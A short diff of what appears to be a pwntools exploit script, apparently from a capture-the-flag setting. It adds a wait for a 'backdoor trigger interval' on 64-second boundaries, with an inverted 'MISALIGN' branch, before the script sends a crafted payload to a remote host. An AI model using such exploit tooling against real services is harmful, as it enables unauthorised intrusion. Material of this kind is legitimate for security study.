@@ -71,6 +71,14 @@ payload = flat({
 }, length=255)
 assert b"\n" not in payload
 
+if args.MISALIGN:
+  while int(time.time())%64 == 0:
+    time.sleep(0.1)
+else:
+  log.info("Waiting for backdoor trigger interval...")
+  while int(time.time())%64 != 0:
+    time.sleep(0.5)
+
 if args.REMOTE:
   r = remote(args.HOST, args.PORT)
 else:
